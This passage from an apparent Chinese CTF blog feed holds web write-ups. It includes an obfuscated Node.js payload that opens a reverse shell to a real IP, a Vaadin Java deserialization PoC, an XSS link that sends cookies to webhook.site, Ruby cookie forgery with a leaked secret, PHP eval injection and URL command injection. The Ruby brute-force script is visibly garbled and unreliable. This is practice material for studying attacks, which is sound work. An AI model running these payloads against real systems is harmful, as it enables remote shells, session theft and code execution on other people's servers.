src="../images/image-20230611213635442.png" alt="image-20230611213635442"></p><p>这是过滤内容</p><p>这里的话因为存在过滤，所以使用with替代<code>.</code>,用ascii替代其他字符  这里的正则是必须得用ascii  括号里的内容必须得用，括号外的就可以直接写字母</p><p><strong>payload</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">with</span>(<span class="title class_">String</span>)<span class="title function_">with</span>(f=fromCharCode,<span class="variable language_">this</span>)<span class="title function_">with</span>(constructor)<span class="title function_">with</span>(<span class="title function_">constructor</span>(<span class="params">f(r=<span class="number">114</span>,e=<span class="number">101</span>,t=<span class="number">116</span>,<span class="number">117</span>,r,<span class="number">110</span>,<span class="number">32</span>,p=<span class="number">112</span>,r,<span class="number">111</span>,c=<span class="number">99</span>,e,s=<span class="number">115</span>,s)</span>)(<span class="params"></span>))<span class="title function_">with</span>(mainModule)<span class="title function_">with</span>(<span class="built_in">require</span>(<span class="title function_">f</span>(c,h=<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,p,r,<span class="number">111</span>,c,e,s,s)))<span class="title function_">exec</span>(<span class="title function_">f</span>(<span class="number">98</span>,<span class="number">97</span>,s,h,<span class="number">32</span>,<span class="number">45</span>,c,<span class="number">32</span>,<span class="number">34</span>,<span class="number">98</span>,<span class="number">97</span>,s,h,<span class="number">32</span>,<span class="number">45</span>,<span class="number">105</span>,<span class="number">32</span>,<span class="number">62</span>,<span class="number">38</span>,<span class="number">32</span>,<span class="number">47</span>,<span class="number">100</span>,e,<span class="number">118</span>,<span class="number">47</span>,t,c,p,<span class="number">47</span>,a=<span class="number">52</span>,<span class="number">55</span>,<span class="number">46</span>,b=<span class="number">49</span>,<span class="number">48</span>,a,<span class="number">46</span>,b,a,<span class="number">46</span>,b,<span class="number">54</span>,<span class="number">48</span>,<span class="number">47</span>,b,a,a,a,<span class="number">32</span>,<span class="number">48</span>,<span class="number">62</span>,<span class="number">38</span>,b,<span class="number">34</span>))</span><br></pre></td></tr></table></figure><p><strong>把ascii转化一下就能看到原本的样子了</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_61839115/article/details/131117164&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;ezrce&quot;&gt;&lt;a href=&quot;#ezrce&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    
    <category term="陕西省赛—web-2023" scheme="https://ke1nys.github.io/tags/%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E2%80%94web-2023/"/>
    
  </entry>
  
  <entry>
    <title>java-vaadin</title>
    <link href="https://ke1nys.github.io/posts/7d138d32.html"/>
    <id>https://ke1nys.github.io/posts/7d138d32.html</id>
    <published>2023-06-08T08:59:50.000Z</published>
    <updated>2023-06-12T06:48:37.935Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://su18.org/post/ysoserial-su18-5/">参考文章</a></p><h2 id="Vaadin1"><a href="#Vaadin1" class="headerlink" title="Vaadin1"></a>Vaadin1</h2><p>Vaadin 是一个在Java后端快速开发web应用程序的平台。用 Java 或 TypeScript 构建可伸缩的 UI，并使用集成的工具、组件和设计系统来更快地迭代、更好地设计和简化开发过程。</p><p>又是一个没有听说过的平台框架。Vaadin 的反序列化调用链同样十分简单，依旧是使用反射调用 getter 方法的类来触发 TemplatesImpl 利用链，接下来看一下具体的调用点。</p><p>(<strong>这里写这个链子的原因是以为这个链子会是用反射来触发getter方法</strong>)   —-&gt;   <strong>可以考虑一下和fastjson共用</strong></p><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>先装一下maven依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.vaadin<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>vaadin-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.7.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="NestedMethodProperty"><a href="#NestedMethodProperty" class="headerlink" title="NestedMethodProperty"></a>NestedMethodProperty</h4><p><code>com.vaadin.data.util.NestedMethodProperty</code> 类是一个封装访问属性方法的类。构造方法接收两个参数，一个是对象实例，一个是属性值。初始化时将调用 initialize 方法获取实例类中的相关信息存放在成员变量中。</p><p><img src="../images/image-20230609094402190.png" alt="image-20230609094402190"></p><p>等到调用 <code>NestedMethodProperty</code> 的 <code>getValue</code> 方法时，就会反射调用封装对象指定属性的 <code>getter</code> 方法。</p><p><img src="../images/image-20230609094455778.png" alt="image-20230609094455778"></p><p>因此这个类又是可以触发 TemplatesImpl 的利用方式。</p><p>(<strong>接下来就是找哪个类的某个方法能触发这个getValue方法了</strong>)</p><h4 id="PropertysetItem"><a href="#PropertysetItem" class="headerlink" title="PropertysetItem"></a>PropertysetItem</h4><p>触发类是 <code>com.vaadin.data.util.PropertysetItem</code> ，这个类用来存储 Property 属性值，为其映射一个 id 对象。</p><p>数据存放在成员变量 map 中，想要获取相应属性时，则调用 <code>getItemProperty</code> 方法在 map 中获取。</p><p><img src="../images/image-20230609094752009.png" alt="image-20230609094752009"></p><p>映射的 id 对象则储存在成员变量 list 中。</p><p><img src="../images/image-20230609094809632.png" alt="image-20230609094809632"></p><p>PropertysetItem 的 toString 方法，获取全部 id 对象并遍历，使用 getItemProperty 方法获取映射的 Property 属性对象，并调用其 getValue 方法。</p><p><img src="../images/image-20230609094935073.png" alt="image-20230609094935073"></p><p>这是获取id对象是因为  </p><p><img src="../images/image-20230609095105195.png" alt="image-20230609095105195"></p><p>所以说通过id这个对象就能找到<code>Property</code>这个属性的值</p><p>因此可以使用 <code>PropertysetItem</code> 的 <code>toString</code> 方法触发 <code>NestedMethodProperty</code> 的 <code>getValue</code> 方法。完成漏洞链的构造。</p><h3 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h3><p><strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.NestedMethodProperty;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.PropertysetItem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Vaadin</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成包含恶意类字节码的 TemplatesImpl 类</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">tmpl</span> <span class="operator">=</span> SerializeUtil.generateTemplatesImpl();</span><br><span class="line"></span><br><span class="line">        <span class="type">PropertysetItem</span> <span class="variable">pItem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertysetItem</span>();</span><br><span class="line"></span><br><span class="line">        NestedMethodProperty&lt;Object&gt; nmprop = <span class="keyword">new</span> <span class="title class_">NestedMethodProperty</span>&lt;Object&gt;(tmpl, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        pItem.addItemProperty(<span class="string">&quot;outputProperties&quot;</span>, nmprop);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化 BadAttributeValueExpException 并反射写入</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exception</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;su18&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span>     <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(exception, pItem);</span><br><span class="line"></span><br><span class="line">        SerializeUtil.writeObjectToFile(exception);</span><br><span class="line">        SerializeUtil.readFileObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230609102414521.png" alt="image-20230609102414521"></p><p><strong>第一步是传入一个对象和一个<code>propertyName</code>属性</strong></p><p><strong>第二步是给<code>propertyName</code>这个属性映射一个id对象</strong>    </p><p><img src="../images/image-20230609102614981.png" alt="image-20230609102614981"></p><p>这里的话是使用<code>BadAttributeValueExpException</code>这个类来触发<code>toString()</code>方法</p><p>然后就会会调用到<code>PropertysetItem#toString()</code> 方法，然后遍历的时候会调用到<code>NestedMethodProperty#getValue()</code>方法  然后反射调用<code>TemplatesImpl 类</code></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>1.利用说明</strong></p><ul><li>反序列化 BadAttributeValueExpException 触发 PropertysetItem 的 toString 方法 调用到 NestedMethodProperty 的 getValue 方法。</li></ul><p><strong>2.Gadget总结</strong></p><ul><li>kick-off gadget：<code>javax.management.BadAttributeValueExpException#readObject()</code></li><li><p>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties()</code></p></li><li><p>chain gadget：<code>com.vaadin.data.util.NestedMethodProperty#getValue()</code></p></li></ul><p><strong>3.调用链展示</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">    PropertysetItem.toString()</span><br><span class="line">            PropertysetItem.getPropertyId()</span><br><span class="line">                NestedMethodProperty.getValue()</span><br><span class="line">                    TemplatesImpl.getObjectPropertyValue()</span><br></pre></td></tr></table></figure><p><strong>4.依赖版本</strong></p><p><code>vaadin-server : 7.7.14</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://su18.org/post/ysoserial-su18-5/&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Vaadin1&quot;&gt;&lt;a href=&quot;#Vaadin1&quot; class=&quot;headerlink&quot; title=&quot;Vaadin1&quot;&gt;&lt;/a</summary>
      
    
    
    
    
    <category term="java-vaadin" scheme="https://ke1nys.github.io/tags/java-vaadin/"/>
    
  </entry>
  
  <entry>
    <title>justctf2023-web</title>
    <link href="https://ke1nys.github.io/posts/ddd9620c.html"/>
    <id>https://ke1nys.github.io/posts/ddd9620c.html</id>
    <published>2023-06-06T07:30:57.000Z</published>
    <updated>2023-06-06T10:50:37.607Z</updated>
    
    <content type="html"><![CDATA[<h2 id="eXtra-Safe-Security-layers"><a href="#eXtra-Safe-Security-layers" class="headerlink" title="eXtra Safe Security layers"></a>eXtra Safe Security layers</h2><p>道题的考点是       <strong>xss和nodejs代码审计</strong>   </p><p>首先他给了一个压缩包，是题目的源码</p><p><img src="../images/image-20230606153236064.png" alt="image-20230606153236064"></p><p>然后我们来进行分析</p><p><strong>关键点在这</strong></p><p><img src="../images/image-20230606153335616.png" alt="image-20230606153335616"></p><p>就是这里可以进行重新修改<code>res.user</code>的值</p><p><img src="../images/image-20230606153431868.png" alt="image-20230606153431868"></p><p>然后<code>res.user</code>的结构是这样的那么我们就可以修改</p><p> <code>unmodifiable.background</code>和一个 <code>unmodifiable.CSP</code>属性</p><p><img src="../images/image-20230606153555797.png" alt="image-20230606153555797"></p><p>然后又返回到这里，如果<code>res.user.unmodifiable.CSP</code>不为空的话就返回它，如果为空就返回<code>defaultCSP</code></p><p><strong>讲了这么多，最关键的地方来了</strong></p><p><img src="../images/image-20230606153804851.png" alt="image-20230606153804851"></p><p>这里的话会对我们的<code>unmodifiable.background</code>进行渲染并且加载</p><p>结合之前我们知道的可以对 <code>unmodifiable.background</code>和一个 <code>unmodifiable.CSP</code>属性进行修改，然后左上角<code>report</code>一下，让机器人去访问这个页面，就可以拿到这个admin页面的cookie了</p><ul><li><strong>payload</strong></li></ul><p><code>http://xssl.web.jctf.pro/?text=hi&amp;[unmodifiable][CSP]=a&amp;[unmodifiable][background]=https://webhook.site/f202667e-9179-425d-80c1-fd62da5915d4?$&#123;document.cookie&#125;</code></p><p>(<strong>国外的题目最好用这种接收http返回信息的网站，用国内vps的话会接收不到</strong>)</p><p>在这种情况下，这会将 document.cookie 发送到上面的 webhook。现在我们只需使用“报告为不当”按钮进行报告，服务器机器人就会访问此链接。机器人将通过 webhook 将 cookie 发送给我们：</p><p><img src="../images/image-20230606154247092.png" alt="image-20230606154247092"></p><p>成功加载我们构造的<code>background</code>,然后report让机器人去访问</p><p><img src="../images/image-20230606154332347.png" alt="image-20230606154332347"></p><p><img src="../images/image-20230606154344800.png" alt="image-20230606154344800"></p><p>拿到flag</p><h2 id="Dangerous-ruby"><a href="#Dangerous-ruby" class="headerlink" title="Dangerous(ruby)"></a>Dangerous(ruby)</h2><p><a href="https://www.youtube.com/watch?v=fqOcV-T_Qsc">wp讲解</a></p><p>这道题是考察ruby的  <strong>cookie伪造  和ip伪造</strong></p><p>就是通过题目代码给的构造<code>cookie</code>和<code>ip</code>的模板，然后根据这个模板重新构造<code>cookie</code>和<code>ip</code></p><p>  <img src="../images/image-20230606163847914.png" alt="image-20230606163847914"></p><p>题目还是先给了一个文件，让我们来审计代码</p><p>首先我们来看一下这个获取flag的要求</p><p><img src="../images/image-20230606164057404.png" alt="image-20230606164057404"></p><p>这里话是判断<code>username</code>和<code>ip</code>满不满足条件，满足的话就会返回flag</p><p><img src="../images/image-20230606164333686.png" alt="image-20230606164333686"></p><p>然后看这里的前端代码  这里的reply是下面的样子，</p><p><img src="../images/image-20230606164427160.png" alt="image-20230606164427160"></p><p><img src="../images/image-20230606164534853.png" alt="image-20230606164534853"></p><p>和上述页面对应上了</p><p>这就是这个页面返回的结果    (<strong>并且还返回了admin的用户名</strong>)</p><p>但是我们得进行session的伪造，以为现在的<strong>session.user</strong>并不是<code>janitor</code></p><p><img src="../images/image-20230606165011293.png" alt="image-20230606165011293"></p><p>点进去这个<code>new thread</code>的时候会返回一堆信息</p><p><img src="../images/image-20230606165116320.png" alt="image-20230606165116320"></p><p>这里返回了一个最关键的信息就是cookie是咋样生成的，并且还给了生成cookie的secret</p><p>然后我们就可以进行伪造了</p><p><code>:coder=&gt;#&lt;Rack::Protection::EncryptedCookie::Marshal:0x00007ff401b9a530&gt;&#125;</code>根据这个模板来进行</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;encrypted_cookie&#x27;</span></span><br><span class="line"></span><br><span class="line">use <span class="title class_">Rack</span><span class="symbol">:</span><span class="symbol">:Protection</span><span class="symbol">:</span><span class="symbol">:EncryptedCookie</span>,</span><br><span class="line">  <span class="symbol">:secret</span> =&gt; <span class="string">&#x27;a9316e61bc75029d52f915823d7bb628a4adae8b174bce89fd38ec4c7fb925a07e2ccbc01572b9fdce56502ef5d02609e5194a5ddd649ff349a206002e96a99d&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  session[<span class="symbol">:username</span>] = <span class="string">&#x27;janitor&#x27;</span></span><br><span class="line">  <span class="string">&quot;session: &quot;</span> + session.inspect + request.ip</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>然后把cookie进行传参，就可以绕过第一个检测了</p><p>接下来我们就得看看ip怎么进行伪造了</p><p><img src="../images/image-20230606173836307.png" alt="image-20230606173836307"></p><p><strong>就是这里的会对ip和id相加后进行加密后，然后截取</strong></p><p><img src="../images/image-20230606173937628.png" alt="image-20230606173937628"></p><p><img src="../images/image-20230606173951264.png" alt="image-20230606173951264"></p><p>然后写个脚本来对这个ip进行破解</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;digest&quot;</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> <span class="number">0</span>..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">  puts d</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="number">0</span>..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">      <span class="keyword">for</span> b <span class="keyword">in</span> @..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="number">0</span>..<span class="number">255</span> <span class="keyword">do</span></span><br><span class="line">          <span class="keyword">if</span> <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:SHA256</span>.hexdigestd.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span>+c.to s+<span class="string">&quot;.&quot;</span>+b.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span> + a.to <span class="number">5</span> + <span class="string">&quot;1&quot;</span>).slice(<span class="number">0</span>, <span class="number">6</span>) == <span class="string">&quot;32cae2&quot;</span></span><br><span class="line">            <span class="keyword">if</span> <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:SHA256</span>.hexdigest(d.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span>+.to s+<span class="string">&quot;.&quot;</span>+b.to <span class="number">5</span>+<span class="string">&quot;.&quot;</span> + a.to <span class="number">5</span> + <span class="string">&quot;2&quot;</span>).slice(<span class="number">0</span>, <span class="number">6</span>) == <span class="string">&quot;92e1e8&#x27;</span></span><br><span class="line"><span class="string">              puts d.to s+&quot;</span>.<span class="string">&quot;+c.to s+&quot;</span>.<span class="string">&quot;+b.to s+&quot;</span>.<span class="string">&quot;+ a.to s</span></span><br><span class="line"><span class="string">            end</span></span><br><span class="line"><span class="string">          end</span></span><br><span class="line"><span class="string">        end</span></span><br><span class="line"><span class="string">      end</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">  end</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">puts &quot;</span>finished<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>然后提交之后就会返回flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;eXtra-Safe-Security-layers&quot;&gt;&lt;a href=&quot;#eXtra-Safe-Security-layers&quot; class=&quot;headerlink&quot; title=&quot;eXtra Safe Security layers&quot;&gt;&lt;/a&gt;eXtra Sa</summary>
      
    
    
    
    
    <category term="justctf2023-web" scheme="https://ke1nys.github.io/tags/justctf2023-web/"/>
    
  </entry>
  
  <entry>
    <title>NSS-round13-web</title>
    <link href="https://ke1nys.github.io/posts/8e9667d4.html"/>
    <id>https://ke1nys.github.io/posts/8e9667d4.html</id>
    <published>2023-06-04T09:14:16.000Z</published>
    <updated>2023-06-05T10:20:17.791Z</updated>
    
    <content type="html"><![CDATA[<h2 id="flask-jwt"><a href="#flask-jwt" class="headerlink" title="flask?jwt?"></a>flask?jwt?</h2><p>考察的是session伪造</p><p>(不写了，就是简单的session伪造)</p><h2 id="flask-jwt-hard-session伪造"><a href="#flask-jwt-hard-session伪造" class="headerlink" title="flask?jwt?(hard,session伪造)"></a>flask?jwt?(hard,session伪造)</h2><p><strong>考察的也是session伪造  只不过这里把key藏起来了，我们得去找到</strong></p><p>这里的考点是通过报错来获取到<code>secret_key</code></p><p>注册完后进行登录</p><p><img src="../images/image-20230604173436773.png" alt="image-20230604173436773"></p><p>提示你有这个<code>/wor</code>目录</p><p><img src="../images/image-20230604173501780.png" alt="image-20230604173501780"></p><p>告诉你了登录时间(<strong>那么我们就去找一下登录时间是从哪获取的</strong>)</p><p><img src="../images/image-20230604173742024.png" alt="image-20230604173742024"></p><p>然后我们尝试去删除一点点cookie的值使其报错</p><p><img src="../images/image-20230604173954408.png" alt="image-20230604173954408"></p><p>报错之后查看到的信息不全面，那么我们就去拿bp进行发包查看</p><p><img src="../images/image-20230604174055787.png" alt="image-20230604174055787"></p><p>然后就拿到<code>secret_key</code>了   那么我们就接着去重新构造一个cookie就行了</p><p><img src="../images/image-20230604174519826.png" alt="image-20230604174519826"></p><p>这里有个问题就是要把时间戳给删掉，，不然会构造失败</p><p><img src="../images/image-20230604174615095.png" alt="image-20230604174615095"></p><h2 id="MyWeb"><a href="#MyWeb" class="headerlink" title="MyWeb"></a>MyWeb</h2><p><strong>题目描述：试试我的JSON解析工具。</strong></p><h4 id="json的解释"><a href="#json的解释" class="headerlink" title="json的解释"></a>json的解释</h4><p><img src="../images/image-20230604181116728.png" alt="image-20230604181116728"></p><p>实际存储的json是这样的  输出的时候</p><p><img src="../images/image-20230604181140589.png" alt="image-20230604181140589"></p><p>然后进行测试一下看传入的json是咋样的</p><p><img src="../images/image-20230604181347889.png" alt="image-20230604181347889"></p><p><img src="../images/image-20230604181423212.png" alt="image-20230604181423212"></p><p><strong>然后看本地存储的样子</strong></p><p><img src="../images/image-20230604181500207.png" alt="image-20230604181500207"></p><p><strong>这样我们就理解了这个json存储的过了，那么我们就可以进行构造来绕过了</strong></p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p><strong>题目代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="comment">// 写了个网页存储JSON数据，但是还不会处理json格式，这样处理应该没有什么问题吧</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;save&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="variable">$value</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;]&#x27;</span>, <span class="string">&quot;, &#x27;<span class="subst">$value</span>&#x27;]&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&#x27;read&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/tmp/data.json&#x27;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;$data = &#x27;</span> . <span class="variable">$data</span> . <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里审计一手代码，就是一个save和read的过程，我们要想eval的东西是我们想执行的，那就必须破坏它的结构，<strong>那就复制下来在本地测试测试</strong>，怎么才能闭合原有结构，让危险代码逃逸</p><p><code>addslashes</code> 这个函数是用来进行sql转义的用的</p><p><img src="../images/image-20230604175647010.png" alt="image-20230604175647010"></p><p>跟据在上面讲的内容之后，我们知道了json存储的格式是咋样的</p><p><img src="../images/image-20230604181625002.png" alt="image-20230604181625002"></p><p>我们最后要执行的是<code>eval(&#39;$data = &#39; . $data . &#39;;&#39;);</code></p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?mode=save&amp;value=]//%0a;&lt;your_php_code&gt;;//</span><br></pre></td></tr></table></figure><p>首先是这个<code>]</code>这个是为了闭合前面的<code>[</code>然后导致后面的内容可以逃逸出来</p><p>(<strong>这里虽然说json格式会报错，但是<code>file_get_contents</code>是会输出这个json文件里的全部内容的</strong>)</p><p><strong>然后<code>]//%0a;</code>这个是会注释第一行的内容，然后换到第二行</strong></p><p>然后<code>&lt;your_php_code&gt;;//</code><strong>这个是会执行我们设置的代码然后注释掉后面的代码</strong></p><p><img src="../images/image-20230604185620831.png" alt="image-20230604185620831"></p><p>这就是传进去的样子</p><p><strong>接着传值获取环境变量</strong></p><p><img src="../images/image-20230604185826603.png" alt="image-20230604185826603"></p><p><strong>第二行就会执行代码了</strong></p><p><strong>像下面的格式也是可以进行代码执行的</strong>(可以执行<strong>phpinfo()</strong>)</p><p><img src="../images/image-20230604190446540.png" alt="image-20230604190446540"></p><p><strong>总结</strong></p><ul><li>就是利用换行绕过和注释来进行绕过    并且就是这里的话学到了一点就是(<strong>就是有eval的时候并不用得一直盯着他来执行，可以换种思路来</strong>)</li></ul><p>​                      (————————————就像这道题一样————————————)</p><ul><li><strong>原本就是php代码  把eval结构破坏之后进行换到第二行然后就可以执行自己想执行的代码了</strong></li></ul><p><strong>就是以后遇到可以本地执行的代码可以拷贝下来到本地尝试进行解题</strong></p><h2 id="ez-factors"><a href="#ez-factors" class="headerlink" title="ez_factors"></a>ez_factors</h2><p>题目描述：原生 Linux 因数爆破工具。flag在根目录</p><p>(<strong>这题又是使用<code>%0a</code>来进行绕过从而进行命令执行的</strong>)</p><ul><li>这个%0a确实好多题的时候的解</li></ul><p><img src="../images/image-20230604201247967.png" alt="image-20230604201247967"></p><p>点进去的发现这里会对这个数字进行分解，所以就猜想这里进行了<strong>命令执行</strong></p><p>但是在数字后拼接命令的时候发现并不能同时执行(<strong>那么我们就考虑一下使用别的执行来让其两个命令同时</strong>)</p><p>这里的话 <code>; | &amp; %0a</code>都能让其执行</p><p>但是经过多次尝试，发现这里只能返回数字，那么我们就可以<strong>考虑让输出结果以八进制进行输出</strong></p><p><code>od</code>这个命令就符合我们的预期</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/factors/<span class="number">9</span>;od%<span class="number">20</span>-b%<span class="number">20</span>%<span class="number">2</span>fflag</span><br></pre></td></tr></table></figure><p>这里进行必须进行url编码，不然会执行失败</p><p><img src="../images/image-20230604201858291.png" alt="image-20230604201858291"></p><p><img src="../images/image-20230604201815683.png" alt="image-20230604201815683"></p><p>输出全是八进制的数字(<strong>因为都是三个数字在一起</strong>)</p><p><img src="../images/image-20230604202021231.png" alt="image-20230604202021231"></p><p><strong>总结</strong></p><p><strong>题目挺新颖的，只允许输出数字，并且是在url处进行命令执行，然后在用8进制将结果输出</strong></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="../images/image-20230604205358343.png" alt="image-20230604205358343"></p><p>这个一看就是考察<code>apache</code>的漏洞     